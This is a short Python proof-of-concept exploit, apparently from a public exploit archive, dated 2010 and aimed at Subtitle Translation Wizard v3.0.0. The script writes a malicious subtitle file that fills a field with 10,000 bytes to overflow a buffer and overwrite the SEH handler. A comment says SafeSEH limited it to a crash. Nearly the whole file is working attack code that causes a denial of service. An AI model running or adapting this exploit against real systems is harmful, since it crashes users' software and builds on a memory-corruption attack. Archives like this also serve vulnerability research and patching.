#!/usr/bin/python

# Exploit Title: Subtitle Translation Wizard v3.0.0 SEH POC
# Date: Jun 21, 2010
# Author: Blake
# Software Link: http://www.upredsun.com/subtitle-translation/download/st-wizard-setup.exe
# Version: 3.0.0
# Tested on: Windows Vista running in VirtualBox

# SEH is overwritten but only unicode compatible pop pop ret addresses are in st-wizard.exe (SafeSEH).

print "\n======================================"
print " Subtitle Translation Wizard v3.0.0 DoS "
print " Discovered by Blake "
print "======================================\n"

buffer = "\x41" * 10000

print "[+] Creating malicious srt file"
try:
     file = open("poc.srt","w")
     file.write("1\n" + "00:01:48,549 --> 00:01:50,404\n" + buffer)
     file.close()
     print "[+] File created"
except:
     print "[x] Could not create file"

raw_input("\nPress any key to exit...\n")